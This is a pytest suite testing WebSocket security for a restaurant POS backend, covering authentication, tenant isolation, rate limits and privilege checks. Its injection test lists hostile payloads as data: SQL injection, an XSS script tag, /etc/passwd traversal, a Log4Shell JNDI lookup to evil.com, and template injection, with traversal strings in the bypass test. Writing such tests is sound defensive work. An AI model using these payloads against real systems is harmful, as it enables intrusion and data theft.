"""
WebSocket Security Test Suite for Fynlo POS
Tests authentication, authorization, rate limiting, and multi-tenant isolation
"""

import asyncio
import json
import pytest
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi import WebSocket
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.main import app
from app.core.websocket import websocket_manager, WebSocketMessage, EventType
from app.api.v1.endpoints.websocket import (
    MAX_CONNECTIONS_PER_IP,
    MAX_CONNECTIONS_PER_USER,
    MAX_MESSAGES_PER_CONNECTION,
    MAX_MESSAGE_SIZE,
)


class TestWebSocketSecurity:
    """Comprehensive security tests for WebSocket implementation"""

    @pytest.fixture
    def test_client(self):
        return TestClient(app)

    @pytest.fixture
    def mock_db_session(self):
        return MagicMock(spec=Session)

    @pytest.fixture
    def valid_token(self):
        return "valid_jwt_token_here"

    @pytest.fixture
    def invalid_token(self):
        return "invalid_jwt_token"

    @pytest.fixture
    def mock_user(self):
        user = MagicMock()
        user.id = "user_123"
        user.email = "test@example.com"
        user.role = "employee"
        return user

    @pytest.fixture
    def mock_restaurant(self):
        restaurant = MagicMock()
        restaurant.id = "restaurant_123"
        restaurant.name = "Test Restaurant"
        return restaurant

    async def test_websocket_requires_authentication(self, test_client):
        """Test that WebSocket connections require valid authentication"""
        # Attempt connection without token
        with pytest.raises(Exception) as exc_info:
            with test_client.websocket_connect("/api/v1/ws"):
                pass
        assert "401" in str(exc_info.value) or "Unauthorized" in str(exc_info.value)

        # Attempt connection with invalid token
        with pytest.raises(Exception) as exc_info:
            with test_client.websocket_connect("/api/v1/ws?token=invalid_token"):
                pass
        assert "401" in str(exc_info.value) or "Unauthorized" in str(exc_info.value)

    async def test_websocket_token_validation(self, test_client, valid_token, mock_user):
        """Test that WebSocket validates JWT tokens properly"""
        with patch("app.core.auth.verify_token", return_value=mock_user):
            with test_client.websocket_connect(f"/api/v1/ws?token={valid_token}") as websocket:
                # Should connect successfully
                data = websocket.receive_json()
                assert data["type"] == "connection"
                assert data["status"] == "connected"

    async def test_websocket_multi_tenant_isolation(self, test_client, mock_user):
        """Test that users can only access their restaurant's data"""
        restaurant_1_user = MagicMock()
        restaurant_1_user.id = "user_1"
        restaurant_1_user.restaurant_id = "restaurant_1"
        
        restaurant_2_user = MagicMock()
        restaurant_2_user.id = "user_2"
        restaurant_2_user.restaurant_id = "restaurant_2"

        # User 1 subscribes to restaurant 1
        with patch("app.core.auth.verify_token", return_value=restaurant_1_user):
            with test_client.websocket_connect("/api/v1/ws?token=token1") as ws1:
                ws1.send_json({
                    "type": "subscribe",
                    "restaurant_id": "restaurant_1"
                })
                
                # Try to subscribe to restaurant 2 (should fail)
                ws1.send_json({
                    "type": "subscribe",
                    "restaurant_id": "restaurant_2"
                })
                
                response = ws1.receive_json()
                assert response["type"] == "error"
                assert "unauthorized" in response["message"].lower()

    async def test_websocket_rate_limiting_connections_per_ip(self, test_client):
        """Test rate limiting for connections per IP"""
        ip_address = "192.168.1.1"
        
        # Mock the IP extraction
        with patch("app.api.v1.endpoints.websocket.get_client_ip", return_value=ip_address):
            # Create MAX_CONNECTIONS_PER_IP connections
            connections = []
            for i in range(MAX_CONNECTIONS_PER_IP):
                with test_client.websocket_connect(f"/api/v1/ws?token=token_{i}") as ws:
                    connections.append(ws)
            
            # Next connection should fail
            with pytest.raises(Exception) as exc_info:
                with test_client.websocket_connect(f"/api/v1/ws?token=token_extra"):
                    pass
            assert "429" in str(exc_info.value) or "rate limit" in str(exc_info.value).lower()

    async def test_websocket_rate_limiting_connections_per_user(self, test_client, mock_user):
        """Test rate limiting for connections per user"""
        with patch("app.core.auth.verify_token", return_value=mock_user):
            # Create MAX_CONNECTIONS_PER_USER connections
            connections = []
            for i in range(MAX_CONNECTIONS_PER_USER):
                with test_client.websocket_connect(f"/api/v1/ws?token=token&conn_id={i}") as ws:
                    connections.append(ws)
            
            # Next connection should fail
            with pytest.raises(Exception) as exc_info:
                with test_client.websocket_connect(f"/api/v1/ws?token=token&conn_id=extra"):
                    pass
            assert "429" in str(exc_info.value) or "concurrent connections" in str(exc_info.value).lower()

    async def test_websocket_message_rate_limiting(self, test_client, mock_user):
        """Test rate limiting for messages per connection"""
        with patch("app.core.auth.verify_token", return_value=mock_user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as websocket:
                # Send MAX_MESSAGES_PER_CONNECTION messages
                for i in range(MAX_MESSAGES_PER_CONNECTION):
                    websocket.send_json({
                        "type": "ping",
                        "data": f"message_{i}"
                    })
                
                # Next message should trigger rate limit
                websocket.send_json({
                    "type": "ping",
                    "data": "extra_message"
                })
                
                response = websocket.receive_json()
                assert response["type"] == "error"
                assert "rate limit" in response["message"].lower()

    async def test_websocket_message_size_limit(self, test_client, mock_user):
        """Test that oversized messages are rejected"""
        with patch("app.core.auth.verify_token", return_value=mock_user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as websocket:
                # Create a message larger than MAX_MESSAGE_SIZE
                large_data = "x" * (MAX_MESSAGE_SIZE + 1)
                websocket.send_json({
                    "type": "data",
                    "payload": large_data
                })
                
                response = websocket.receive_json()
                assert response["type"] == "error"
                assert "message too large" in response["message"].lower()

    async def test_websocket_injection_prevention(self, test_client, mock_user):
        """Test that WebSocket prevents injection attacks"""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
        ]

        with patch("app.core.auth.verify_token", return_value=mock_user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as websocket:
                for payload in injection_payloads:
                    websocket.send_json({
                        "type": "message",
                        "data": payload
                    })
                    
                    response = websocket.receive_json()
                    # Should either sanitize or reject
                    assert response["type"] in ["error", "message"]
                    if response["type"] == "message":
                        # Check that dangerous characters are sanitized
                        assert "<script>" not in response.get("data", "")
                        assert "DROP TABLE" not in response.get("data", "")

    async def test_websocket_session_timeout(self, test_client, mock_user):
        """Test that WebSocket sessions timeout properly"""
        with patch("app.core.auth.verify_token", return_value=mock_user):
            with patch("app.core.config.settings.WEBSOCKET_SESSION_TIMEOUT", 1):  # 1 second timeout
                with test_client.websocket_connect("/api/v1/ws?token=token") as websocket:
                    # Wait for timeout
                    await asyncio.sleep(2)
                    
                    # Try to send message after timeout
                    websocket.send_json({"type": "ping"})
                    response = websocket.receive_json()
                    assert response["type"] == "error"
                    assert "session expired" in response["message"].lower()

    async def test_websocket_concurrent_connection_handling(self, test_client):
        """Test handling of concurrent connections and race conditions"""
        user1 = MagicMock(id="user1", restaurant_id="restaurant1")
        user2 = MagicMock(id="user2", restaurant_id="restaurant1")
        
        async def connect_and_subscribe(user, token):
            with patch("app.core.auth.verify_token", return_value=user):
                with test_client.websocket_connect(f"/api/v1/ws?token={token}") as ws:
                    ws.send_json({
                        "type": "subscribe",
                        "restaurant_id": "restaurant1"
                    })
                    return ws.receive_json()
        
        # Test concurrent subscriptions
        results = await asyncio.gather(
            connect_and_subscribe(user1, "token1"),
            connect_and_subscribe(user2, "token2"),
        )
        
        # Both should succeed without race conditions
        for result in results:
            assert result["type"] != "error"

    async def test_websocket_malformed_message_handling(self, test_client, mock_user):
        """Test handling of malformed messages"""
        malformed_messages = [
            "not json",
            {"no_type_field": "data"},
            {"type": None},
            {"type": "unknown_type"},
            {"type": "subscribe"},  # Missing required fields
            json.dumps({"type": "test"}) * 1000,  # Very long JSON
        ]

        with patch("app.core.auth.verify_token", return_value=mock_user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as websocket:
                for msg in malformed_messages:
                    if isinstance(msg, str):
                        websocket.send_text(msg)
                    else:
                        websocket.send_json(msg)
                    
                    response = websocket.receive_json()
                    assert response["type"] == "error"
                    assert "invalid" in response["message"].lower() or "malformed" in response["message"].lower()


class TestWebSocketAuthorizationBypass:
    """Test for authorization bypass vulnerabilities"""

    async def test_cannot_bypass_restaurant_authorization(self, test_client):
        """Test that users cannot access other restaurants' data"""
        user = MagicMock()
        user.id = "user1"
        user.restaurant_id = "restaurant1"
        user.role = "employee"

        with patch("app.core.auth.verify_token", return_value=user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as ws:
                # Try various bypass attempts
                bypass_attempts = [
                    {"type": "subscribe", "restaurant_id": "restaurant2"},
                    {"type": "subscribe", "restaurant_id": "../restaurant2"},
                    {"type": "subscribe", "restaurant_id": "restaurant1/../restaurant2"},
                    {"type": "order_update", "restaurant_id": "restaurant2", "order_id": "123"},
                    {"type": "get_orders", "filters": {"restaurant_id": "restaurant2"}},
                ]

                for attempt in bypass_attempts:
                    ws.send_json(attempt)
                    response = ws.receive_json()
                    assert response["type"] == "error"
                    assert "unauthorized" in response["message"].lower() or "forbidden" in response["message"].lower()

    async def test_cannot_escalate_privileges(self, test_client):
        """Test that users cannot escalate their privileges"""
        employee_user = MagicMock()
        employee_user.id = "user1"
        employee_user.role = "employee"
        employee_user.restaurant_id = "restaurant1"

        with patch("app.core.auth.verify_token", return_value=employee_user):
            with test_client.websocket_connect("/api/v1/ws?token=token") as ws:
                # Try manager-only operations
                manager_operations = [
                    {"type": "update_settings", "settings": {"service_charge": 0}},
                    {"type": "delete_order", "order_id": "123"},
                    {"type": "access_reports", "report_type": "financial"},
                    {"type": "manage_users", "action": "create", "user_data": {}},
                ]

                for op in manager_operations:
                    ws.send_json(op)
                    response = ws.receive_json()
                    assert response["type"] == "error"
                    assert "permission" in response["message"].lower() or "unauthorized" in response["message"].lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])